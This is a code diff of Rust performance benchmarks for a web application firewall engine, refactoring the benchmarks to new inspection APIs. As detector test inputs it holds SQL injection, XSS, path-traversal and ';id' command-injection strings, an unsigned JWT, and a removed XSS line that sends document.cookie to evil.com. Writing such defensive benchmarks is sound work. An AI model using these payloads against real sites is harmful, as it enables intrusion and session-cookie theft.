@@ -1,11 +1,12 @@
 //! WAF Performance Benchmarks
 //!
 //! Verifies performance targets from the roadmap:
-//! - <5ms for 500 rules on 1KB input
+//! - <5ms p99 for 285 rules on 1KB input
 //! - <50MB steady state memory
 
-use criterion::{black_box, criterion_group, criterion_main, Criterion, BenchmarkId, Throughput};
+use criterion::{black_box, criterion_group, criterion_main, BenchmarkId, Criterion, Throughput};
 use sentinel_agent_waf::{WafConfig, WafEngine};
+use std::collections::HashMap;
 
 /// Generate realistic test payloads
 fn generate_payloads() -> Vec<(&'static str, String)> {
@@ -15,7 +16,10 @@ fn generate_payloads() -> Vec<(&'static str, String)> {
         ("benign_large", generate_benign_large()),
         ("sqli_simple", "' OR '1'='1".to_string()),
         ("sqli_union", "1 UNION SELECT * FROM users--".to_string()),
-        ("sqli_obfuscated", "1'/**/UNION/**/SELECT/**/password/**/FROM/**/users--".to_string()),
+        (
+            "sqli_obfuscated",
+            "1'/**/UNION/**/SELECT/**/password/**/FROM/**/users--".to_string(),
+        ),
         ("xss_simple", "<script>alert(1)</script>".to_string()),
         ("xss_encoded", "%3Cscript%3Ealert(1)%3C/script%3E".to_string()),
         ("xss_event", "<img src=x onerror=alert(1)>".to_string()),
@@ -59,32 +63,91 @@ fn generate_mixed_attack() -> String {
     "q=search&user=' OR 1=1--&callback=<script>alert(document.cookie)</script>&file=../../etc/passwd&cmd=;id".to_string()
 }
 
-/// Benchmark rule matching performance
-fn benchmark_rule_matching(c: &mut Criterion) {
+/// Benchmark core check() function - single value against all rules
+fn benchmark_check(c: &mut Criterion) {
     let config = WafConfig::default();
-    let engine = WafEngine::new(config);
+    let engine = WafEngine::new(config).expect("Failed to create engine");
     let payloads = generate_payloads();
 
-    let mut group = c.benchmark_group("rule_matching");
+    let mut group = c.benchmark_group("check");
 
     for (name, payload) in &payloads {
         group.throughput(Throughput::Bytes(payload.len() as u64));
-        group.bench_with_input(
-            BenchmarkId::new("check", name),
-            payload,
-            |b, input| {
-                b.iter(|| {
-                    engine.check(
-                        black_box("/api/test"),
-                        black_box(Some(input)),
-                        black_box(&[]),
-                        black_box(None),
-                        black_box(None),
-                    )
-                })
-            },
-        );
+        group.bench_with_input(BenchmarkId::new("query", name), payload, |b, input| {
+            b.iter(|| engine.check(black_box(input), black_box("query")))
+        });
     }
+
+    group.finish();
+}
+
+/// Benchmark check_request() - full request with path, query, headers
+fn benchmark_check_request(c: &mut Criterion) {
+    let config = WafConfig::default();
+    let engine = WafEngine::new(config).expect("Failed to create engine");
+
+    let mut group = c.benchmark_group("check_request");
+
+    // Normal headers
+    let normal_headers: HashMap<String, Vec<String>> = [
+        (
+            "User-Agent".to_string(),
+            vec!["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string()],
+        ),
+        (
+            "Accept".to_string(),
+            vec!["text/html,application/xhtml+xml,application/xml".to_string()],
+        ),
+        (
+            "Accept-Language".to_string(),
+            vec!["en-US,en;q=0.9".to_string()],
+        ),
+        (
+            "Cookie".to_string(),
+            vec!["session=abc123; prefs=dark".to_string()],
+        ),
+    ]
+    .into_iter()
+    .collect();
+
+    // Attack headers
+    let attack_headers: HashMap<String, Vec<String>> = [
+        ("User-Agent".to_string(), vec!["sqlmap/1.0".to_string()]),
+        (
+            "X-Forwarded-For".to_string(),
+            vec!["127.0.0.1, ' OR 1=1--".to_string()],
+        ),
+        (
+            "Referer".to_string(),
+            vec!["https://evil.com/<script>alert(1)</script>".to_string()],
+        ),
+        (
+            "Cookie".to_string(),
+            vec!["admin=true; sql=' UNION SELECT *--".to_string()],
+        ),
+    ]
+    .into_iter()
+    .collect();
+
+    group.bench_function("benign_request", |b| {
+        b.iter(|| {
+            engine.check_request(
+                black_box("/api/v1/products/search"),
+                black_box(Some("category=electronics&limit=20")),
+                black_box(&normal_headers),
+            )
+        })
+    });
+
+    group.bench_function("attack_request", |b| {
+        b.iter(|| {
+            engine.check_request(
+                black_box("/api/v1/search"),
+                black_box(Some("q=' OR 1=1--&debug=true")),
+                black_box(&attack_headers),
+            )
+        })
+    });
 
     group.finish();
 }
@@ -96,25 +159,15 @@ fn benchmark_paranoia_levels(c: &mut Criterion) {
     let mut group = c.benchmark_group("paranoia_levels");
 
     for level in 1..=4 {
-        let mut config = WafConfig::default();
-        config.paranoia_level = level;
-        let engine = WafEngine::new(config);
+        let config = WafConfig {
+            paranoia_level: level,
+            ..Default::default()
+        };
+        let engine = WafEngine::new(config).expect("Failed to create engine");
 
-        group.bench_with_input(
-            BenchmarkId::new("level", level),
-            &payload,
-            |b, input| {
-                b.iter(|| {
-                    engine.check(
-                        black_box("/search"),
-                        black_box(Some(input)),
-                        black_box(&[]),
-                        black_box(None),
-                        black_box(None),
-                    )
-                })
-            },
-        );
+        group.bench_with_input(BenchmarkId::new("level", level), &payload, |b, input| {
+            b.iter(|| engine.check(black_box(input), black_box("query")))
+        });
     }
 
     group.finish();
@@ -123,7 +176,7 @@ fn benchmark_paranoia_levels(c: &mut Criterion) {
 /// Benchmark body inspection with varying sizes
 fn benchmark_body_sizes(c: &mut Criterion) {
     let config = WafConfig::default();
-    let engine = WafEngine::new(config);
+    let engine = WafEngine::new(config).expect("Failed to create engine");
 
     let mut group = c.benchmark_group("body_sizes");
 
@@ -135,19 +188,9 @@ fn benchmark_body_sizes(c: &mut Criterion) {
 
         group.throughput(Throughput::Bytes(size as u64));
         group.bench_with_input(
-            BenchmarkId::new("body_kb", size / 1024),
+            BenchmarkId::new("bytes", size),
             &body,
-            |b, input| {
-                b.iter(|| {
-                    engine.check(
-                        black_box("/api/data"),
-                        black_box(None),
-                        black_box(&[("Content-Type".to_string(), "application/json".to_string())]),
-                        black_box(Some(input.as_bytes())),
-                        black_box(None),
-                    )
-                })
-            },
+            |b, input| b.iter(|| engine.check(black_box(input), black_box("body"))),
         );
     }
 
@@ -159,7 +202,7 @@ fn generate_body_with_attack(size: usize) -> String {
     let mut body = base.to_string();
 
     // Pad to desired size
-    while body.len() < size - 20 {
+    while body.len() < size.saturating_sub(20) {
         body.push_str(r#""padding":"xxxxxxxxxx","#);
     }
     body.push_str(r#""end":"done"}"#);
@@ -167,89 +210,70 @@ fn generate_body_with_attack(size: usize) -> String {
     body
 }
 
-/// Benchmark header inspection
-fn benchmark_header_inspection(c: &mut Criterion) {
-    let config = WafConfig::default();
-    let engine = WafEngine::new(config);
-
-    let mut group = c.benchmark_group("header_inspection");
-
-    // Normal headers
-    let normal_headers = vec![
-        ("User-Agent".to_string(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string()),
-        ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml".to_string()),
-        ("Accept-Language".to_string(), "en-US,en;q=0.9".to_string()),
-        ("Cookie".to_string(), "session=abc123; prefs=dark".to_string()),
-    ];
-
-    // Attack headers
-    let attack_headers = vec![
-        ("User-Agent".to_string(), "sqlmap/1.0".to_string()),
-        ("X-Forwarded-For".to_string(), "127.0.0.1, ' OR 1=1--".to_string()),
-        ("Referer".to_string(), "https://evil.com/<script>alert(1)</script>".to_string()),
-        ("Cookie".to_string(), "admin=true; sql=' UNION SELECT *--".to_string()),
-    ];
-
-    group.bench_function("normal_headers", |b| {
-        b.iter(|| {
-            engine.check(
-                black_box("/"),
-                black_box(None),
-                black_box(&normal_headers),
-                black_box(None),
-                black_box(None),
-            )
-        })
-    });
-
-    group.bench_function("attack_headers", |b| {
-        b.iter(|| {
-            engine.check(
-                black_box("/"),
-                black_box(None),
-                black_box(&attack_headers),
-                black_box(None),
-                black_box(None),
-            )
-        })
-    });
-
-    group.finish();
-}
-
-/// Benchmark automata engine specifically
+/// Benchmark automata engine - multi-pattern matching
 fn benchmark_automata(c: &mut Criterion) {
     let config = WafConfig::default();
-    let engine = WafEngine::new(config);
+    let engine = WafEngine::new(config).expect("Failed to create engine");
 
     let mut group = c.benchmark_group("automata_engine");
 
     // Test pattern that should match multiple rules
-    let multi_match = "UNION SELECT password FROM users WHERE '1'='1' AND <script>document.cookie</script>";
+    let multi_match =
+        "UNION SELECT password FROM users WHERE '1'='1' AND <script>document.cookie</script>";
 
     group.bench_function("multi_pattern_match", |b| {
-        b.iter(|| {
-            engine.check(
-                black_box("/search"),
-                black_box(Some(multi_match)),
-                black_box(&[]),
-                black_box(None),
-                black_box(None),
-            )
-        })
+        b.iter(|| engine.check(black_box(multi_match), black_box("query")))
     });
 
     // Test pattern that matches no rules (worst case - full scan)
     let no_match = "Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.";
 
     group.bench_function("no_pattern_match", |b| {
+        b.iter(|| engine.check(black_box(no_match), black_box("query")))
+    });
+
+    group.finish();
+}
+
+/// Benchmark API security inspection
+fn benchmark_api_security(c: &mut Criterion) {
+    let config = WafConfig {
+        api_security: sentinel_agent_waf::config::ApiSecurityConfig {
+            graphql_enabled: true,
+            json_enabled: true,
+            jwt_enabled: true,
+            ..Default::default()
+        },
+        ..Default::default()
+    };
+    let engine = WafEngine::new(config).expect("Failed to create engine");
+
+    let mut group = c.benchmark_group("api_security");
+
+    // GraphQL query
+    let graphql_body = r#"{"query":"{ user(id: 1) { name email } }"}"#;
+
+    group.bench_function("graphql_query", |b| {
         b.iter(|| {
-            engine.check(
-                black_box("/about"),
-                black_box(Some(no_match)),
-                black_box(&[]),
+            engine.check_api(
+                black_box("/graphql"),
+                black_box(Some("application/json")),
+                black_box(Some(graphql_body)),
                 black_box(None),
+            )
+        })
+    });
+
+    // JWT inspection
+    let jwt = "Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTY3ODkwIn0.";
+
+    group.bench_function("jwt_none_alg", |b| {
+        b.iter(|| {
+            engine.check_api(
+                black_box("/api/data"),
+                black_box(Some("application/json")),
                 black_box(None),
+                black_box(Some(jwt)),
             )
         })
     });
@@ -257,97 +281,21 @@ fn benchmark_automata(c: &mut Criterion) {
     group.finish();
 }
 
-/// Benchmark ML detection if enabled
-fn benchmark_ml_detection(c: &mut Criterion) {
-    let mut config = WafConfig::default();
-    config.ml.enabled = true;
-    config.ml.classifier_enabled = true;
-    let engine = WafEngine::new(config);
+/// Benchmark sensitive data detection
+fn benchmark_sensitive_data(c: &mut Criterion) {
+    let config = WafConfig {
+        sensitive_data: sentinel_agent_waf::config::SensitiveDataDetectionConfig {
+            enabled: true,
+            credit_card_detection: true,
+            ssn_detection: true,
+            api_key_detection: true,
+            private_key_detection: true,
+        },
+        ..Default::default()
+    };
+    let engine = WafEngine::new(config).expect("Failed to create engine");
 
-    let mut group = c.benchmark_group("ml_detection");
-
-    let payloads = vec![
-        ("benign", "SELECT name FROM products WHERE category = 'electronics'"),
-        ("sqli", "' OR '1'='1' UNION SELECT password FROM users--"),
-        ("xss", "<script>document.location='http://evil.com/'+document.cookie</script>"),
-    ];
-
-    for (name, payload) in payloads {
-        group.bench_function(name, |b| {
-            b.iter(|| {
-                engine.check(
-                    black_box("/api/search"),
-                    black_box(Some(payload)),
-                    black_box(&[]),
-                    black_box(None),
-                    black_box(None),
-                )
-            })
-        });
-    }
-
-    group.finish();
-}
-
-/// Benchmark full request inspection (simulates real-world usage)
-fn benchmark_full_request(c: &mut Criterion) {
-    let config = WafConfig::default();
-    let engine = WafEngine::new(config);
-
-    let mut group = c.benchmark_group("full_request");
-
-    // Simulate a complete request with all components
-    let headers = vec![
-        ("User-Agent".to_string(), "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36".to_string()),
-        ("Accept".to_string(), "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8".to_string()),
-        ("Accept-Language".to_string(), "en-US,en;q=0.5".to_string()),
-        ("Accept-Encoding".to_string(), "gzip, deflate, br".to_string()),
-        ("Connection".to_string(), "keep-alive".to_string()),
-        ("Cookie".to_string(), "session=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; prefs=theme%3Ddark%26lang%3Den".to_string()),
-        ("Content-Type".to_string(), "application/json".to_string()),
-    ];
-
-    let body = r#"{"search":"laptop","filters":{"price_min":500,"price_max":2000,"brand":["apple","dell","lenovo"]},"sort":"relevance","page":1}"#;
-
-    // Benign request
-    group.bench_function("benign_full", |b| {
-        b.iter(|| {
-            engine.check(
-                black_box("/api/v1/products/search"),
-                black_box(Some("category=electronics&limit=20")),
-                black_box(&headers),
-                black_box(Some(body.as_bytes())),
-                black_box(None),
-            )
-        })
-    });
-
-    // Attack request
-    let attack_body = r#"{"search":"laptop' UNION SELECT * FROM users--","callback":"<script>alert(1)</script>"}"#;
-
-    group.bench_function("attack_full", |b| {
-        b.iter(|| {
-            engine.check(
-                black_box("/api/v1/products/search"),
-                black_box(Some("q=' OR 1=1--&debug=true")),
-                black_box(&headers),
-                black_box(Some(attack_body.as_bytes())),
-                black_box(None),
-            )
-        })
-    });
-
-    group.finish();
-}
-
-/// Benchmark response body inspection
-fn benchmark_response_inspection(c: &mut Criterion) {
-    let mut config = WafConfig::default();
-    config.response_inspection_enabled = true;
-    config.sensitive_data.enabled = true;
-    let engine = WafEngine::new(config);
-
-    let mut group = c.benchmark_group("response_inspection");
+    let mut group = c.benchmark_group("sensitive_data");
 
     // Response with no sensitive data
     let clean_response = r#"{"user":{"name":"John Doe","email":"j***@example.com","id":12345}}"#;
@@ -356,42 +304,39 @@ fn benchmark_response_inspection(c: &mut Criterion) {
     let sensitive_response = r#"{"user":{"name":"John Doe","ssn":"123-45-6789","card":"4111111111111111","aws_key":"AKIAIOSFODNN7EXAMPLE"}}"#;
 
     group.bench_function("clean_response", |b| {
-        b.iter(|| {
-            engine.check_response_body(black_box(clean_response.as_bytes()))
-        })
+        b.iter(|| engine.check_sensitive_data(black_box(clean_response)))
     });
 
     group.bench_function("sensitive_response", |b| {
-        b.iter(|| {
-            engine.check_response_body(black_box(sensitive_response.as_bytes()))
-        })
+        b.iter(|| engine.check_sensitive_data(black_box(sensitive_response)))
     });
 
     group.finish();
 }
 
-/// Benchmark throughput (requests per second)
+/// Benchmark throughput (requests per second simulation)
 fn benchmark_throughput(c: &mut Criterion) {
     let config = WafConfig::default();
-    let engine = WafEngine::new(config);
+    let engine = WafEngine::new(config).expect("Failed to create engine");
 
     let mut group = c.benchmark_group("throughput");
     group.throughput(Throughput::Elements(1));
 
     // Measure raw requests per second with typical payload
     let query = "search=laptop&category=electronics&page=1";
-    let headers = vec![
-        ("User-Agent".to_string(), "Mozilla/5.0".to_string()),
-    ];
+    let headers: HashMap<String, Vec<String>> = [(
+        "User-Agent".to_string(),
+        vec!["Mozilla/5.0".to_string()],
+    )]
+    .into_iter()
+    .collect();
 
     group.bench_function("requests_per_sec", |b| {
         b.iter(|| {
-            engine.check(
+            engine.check_request(
                 black_box("/api/search"),
                 black_box(Some(query)),
                 black_box(&headers),
-                black_box(None),
-                black_box(None),
             )
         })
     });
@@ -399,17 +344,36 @@ fn benchmark_throughput(c: &mut Criterion) {
     group.finish();
 }
 
+/// Memory usage estimation (approximate)
+fn benchmark_engine_creation(c: &mut Criterion) {
+    let mut group = c.benchmark_group("engine_creation");
+
+    for level in 1..=4 {
+        group.bench_function(BenchmarkId::new("paranoia", level), |b| {
+            b.iter(|| {
+                let config = WafConfig {
+                    paranoia_level: level,
+                    ..Default::default()
+                };
+                WafEngine::new(config).expect("Failed to create engine")
+            })
+        });
+    }
+
+    group.finish();
+}
+
 criterion_group!(
     benches,
-    benchmark_rule_matching,
+    benchmark_check,
+    benchmark_check_request,
     benchmark_paranoia_levels,
     benchmark_body_sizes,
-    benchmark_header_inspection,
     benchmark_automata,
-    benchmark_ml_detection,
-    benchmark_full_request,
-    benchmark_response_inspection,
+    benchmark_api_security,
+    benchmark_sensitive_data,
     benchmark_throughput,
+    benchmark_engine_creation,
 );
 
 criterion_main!(benches);
